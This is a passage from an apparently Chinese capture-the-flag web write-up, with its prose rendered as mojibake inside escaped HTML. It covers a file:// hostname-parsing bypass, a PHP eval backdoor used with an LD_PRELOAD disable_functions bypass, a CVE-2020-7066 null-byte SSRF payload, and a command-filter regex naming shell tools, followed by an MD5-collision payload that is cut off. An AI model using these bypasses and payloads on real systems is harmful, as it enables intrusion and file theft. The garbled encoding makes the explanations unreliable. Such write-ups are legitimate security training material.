class=&#34;hljs-string&#34;&gt;&amp;#x27;suctf.cc&amp;#x27;&lt;/span&gt;:&lt;br&gt;        return urllib.request.&lt;span class=&#34;hljs-built_in&#34;&gt;urlopen&lt;/span&gt;(finalUrl, timeout=&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;).&lt;span class=&#34;hljs-built_in&#34;&gt;read&lt;/span&gt;()&lt;br&gt;    else:&lt;br&gt;        return &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;æˆ‘æ‰Œ your problem? 333&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç¬¬ä¸€å±‚ï¼Œå½“&lt;code&gt;//&lt;/code&gt;æ²¡æœ‰æ­£ç¡®å¼•å…¥æ—¶hostnameå°±æ— æ³•æ­£ç¡®åŒ¹é…åˆ°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦&lt;code&gt;////&lt;/code&gt;å³å¯ç»•è¿‡ç¬¬ä¸€å±‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç¬¬äºŒã€ä¸‰å±‚å’Œç¬¬ä¸€å±‚ä¸€æ ·ï¼Œä¹Ÿç»•è¿‡äº†&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Nginxé‡è¦æ–‡ä»¶ä½ç½®&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;br&gt;é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;nginx&lt;br&gt;ä¸»é…ç½®æ–‡ä»¶ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;nginx&lt;span class=&#34;hljs-regexp&#34;&gt;/conf/&lt;/span&gt;nginx.conf&lt;br&gt;ç®¡ç†è„šæœ¬ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;lib64&lt;span class=&#34;hljs-regexp&#34;&gt;/systemd/&lt;/span&gt;system/nginx.service&lt;br&gt;æ¨¡å—ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;lisb64&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/m&lt;/span&gt;odules&lt;br&gt;åº”ç”¨ç¨‹åºï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;sbin/nginx&lt;br&gt;ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;share&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/&lt;/span&gt;html&lt;br&gt;æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log/nginx&lt;br&gt;é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;local&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/&lt;/span&gt;conf/nginx.conf&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;/usr/local/nginx/conf/nginx.confè¯»åˆ°flagä½ç½®file:////suctf.cc/usr/fffffflagæ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ®è¯´é¢„æœŸè§£æ˜¯&lt;code&gt;file://suctf.câ„†sr/fffffflag&lt;/code&gt;(&lt;a href=&#34;https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session&#34;&gt;https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;GKCTF2020-CheckIN&#34;&gt;&lt;a href=&#34;#GKCTF2020-CheckIN&#34; class=&#34;headerlink&#34; title=&#34;[GKCTF2020]CheckIN&#34;&gt;&lt;/a&gt;[GKCTF2020]CheckIN&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php-template&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php-template&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Check_In&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;xml&#34;&gt;&lt;/span&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;ClassName&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$code&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$decode&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;php&#34;&gt;        &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;code = @&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;x()[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Ginkgo&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;decode = @base64_decode( &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;code );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                @&lt;span class=&#34;hljs-keyword&#34;&gt;Eval&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;decode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;x&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;php&#34;&gt;        &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; ClassName();&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç»™äº†shellï¼Œå…ˆçœ‹ä¸€ä¸‹phpinfoï¼Œå‘ç°æœ‰disable_functionsï¼Œåº”è¯¥æ˜¯é¥¶disable_functionsçš„é¢˜ç›®ï¼Œ&lt;code&gt;/var/tmp/&lt;/code&gt;å¯ä»¥å†™æ–‡ä»¶ï¼Œå‚è€ƒLD_PRELOADçš„without send_mailæ–¹æ³•ç»•è¿‡ï¼Œåˆ©ç”¨/readflagå‘½ä»¤æ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;GKCTF2020-cveç‰ˆç­¾åˆ°&#34;&gt;&lt;a href=&#34;#GKCTF2020-cveç‰ˆç­¾åˆ°&#34; class=&#34;headerlink&#34; title=&#34;[GKCTF2020]cveç‰ˆç­¾åˆ°&#34;&gt;&lt;/a&gt;[GKCTF2020]cveç‰ˆç­¾åˆ°&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;æç¤ºcve-2020-7066ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥%00æˆªæ–­&lt;/li&gt;
&lt;li&gt;headeré‡Œæœ‰hintæç¤ºflagåœ¨localhost&lt;/li&gt;
&lt;li&gt;è®¿é—®?url=127.0.0.1%00.ctfhub.comæ‹¿åˆ°æç¤ºhostè¦ä»¥123ç»“å°¾&lt;/li&gt;
&lt;li&gt;è®¿é—®?url=127.0.0.123%00.ctfhub.comæ‹¿åˆ°flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å®‰æ´µæ¯-2019-easy-web&#34;&gt;&lt;a href=&#34;#å®‰æ´µæ¯-2019-easy-web&#34; class=&#34;headerlink&#34; title=&#34;[å®‰æ´µæ¯ 2019]easy_web&#34;&gt;&lt;/a&gt;[å®‰æ´µæ¯ 2019]easy_web&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;urlä¸­çš„imgç»è¿‡2æ¬¡base64è§£ç +1æ¬¡ASCII Hexè§£ç å¾—åˆ°555.pngï¼Œäºæ˜¯æŠŠ555.pngæ”¹æˆindex.phpè¯»åˆ°æºç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;error_reporting(E_ALL || ~ E_NOTICE);&lt;br&gt;header(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;content-type:text/html;charset=utf-8&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;]) || !&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;])) &lt;br&gt;    header(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;amp;cmd=&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = hex2bin(base64_decode(base64_decode(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;])));&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = preg_replace(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/[^a-zA-Z0-9.]+/&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/flag/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;img src =&amp;quot;./ctf3.jpeg&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;xixiï½ no flag&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$txt&lt;/span&gt; = base64_encode(file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;));&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;img src=&amp;#x27;data:image/gif;base64,&amp;quot;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$txt&lt;/span&gt; . &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;#x27;&amp;gt;&amp;lt;/img&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&amp;#x27;|\&amp;quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&amp;#123;|\&amp;#125;|\(|\)|\&amp;amp;[^\d]|@|\||\\$|\[|\]|&amp;#123;|&amp;#125;|\(|\)|-|&amp;lt;|&amp;gt;/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;forbid ~&amp;quot;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;] !== (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;] &amp;amp;&amp;amp; md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;]) === md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; `&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;`;&lt;br&gt;    &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;md5 is funny ~&amp;quot;&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;lt;style&amp;gt;&lt;br&gt;  body&amp;#123;&lt;br&gt;   background:url(./bj.png)  no-repeat center center;&lt;br&gt;   background-size:cover;&lt;br&gt;   background-attachment:fixed;&lt;br&gt;   background-color:&lt;span class=&#34;hljs-comment&#34;&gt;#CCCCCC;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&amp;lt;/style&amp;gt;&lt;br&gt;&amp;lt;body&amp;gt;&lt;br&gt;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å…¶ä¸­&lt;code&gt;if ((string)$_POST[&amp;#39;a&amp;#39;] !== (string)$_POST[&amp;#39;b&amp;#39;] &amp;amp;&amp;amp; md5($_POST[&amp;#39;a&amp;#39;]) === md5($_POST[&amp;#39;b&amp;#39;]))&lt;/code&gt;åˆ©ç”¨payload&lt;/p&gt;
&lt;figure class=&#34;highlight llvm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs llvm&#34;&gt;a&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c9&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%68&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%ff&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%e3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d4&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%77&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%15&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%87&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%a7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%1&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%dc&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%56&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;a&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%78&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%18&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%af&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%bf&lt;/span&gt;&lt;span 